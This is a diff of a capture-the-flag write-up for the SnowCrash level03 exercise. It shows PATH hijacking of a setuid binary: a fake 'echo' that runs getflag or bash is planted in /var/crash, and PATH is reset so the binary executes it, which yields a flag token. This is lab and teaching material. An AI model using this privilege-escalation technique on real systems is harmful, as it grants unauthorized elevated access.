@@ -91,13 +91,12 @@ level03@SnowCrash:~$ id flag03
 >>uid=3003(flag03)<< gid=3003(flag03) groups=3003(flag03),1001(flag)
 
 # With all this information, we guessed that we needed to find a way to execute a command on behalf of the file owner, flag03. 
-# This mean we could bypass su's password checking and directly invoke a shell as flag03.
+# This mean we could bypass su's password checking and directly invoke getflag, or bash.
 # Since this program uses env to execute a command, it means modifying the env could influence the behavior of the program.
 # Since the binary invoked by env is echo, we're going to modify the PATH variable so that env finds a malicious version of echo first.
 # This is how we did it (/var/crash is the first directory I found where I could create a file) :
 
-level03@SnowCrash:~$ echo -n "/bin/bash" > /var/crash/echo
-level03@SnowCrash:~$ export PATH=/var/crash:$PATH
-level03@SnowCrash:~$ ./level03
-bash: /home/user/level03/.bashrc: Permission denied
-flag03@SnowCrash:~$
+level03@SnowCrash:~$ echo -n "/bin/getflag" > /var/crash/echo (on peut aussi choisir bash ici).
+level03@SnowCrash:~$ chmod +x /var/crash/echo
+level03@SnowCrash:~$ PATH=/var/crash ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
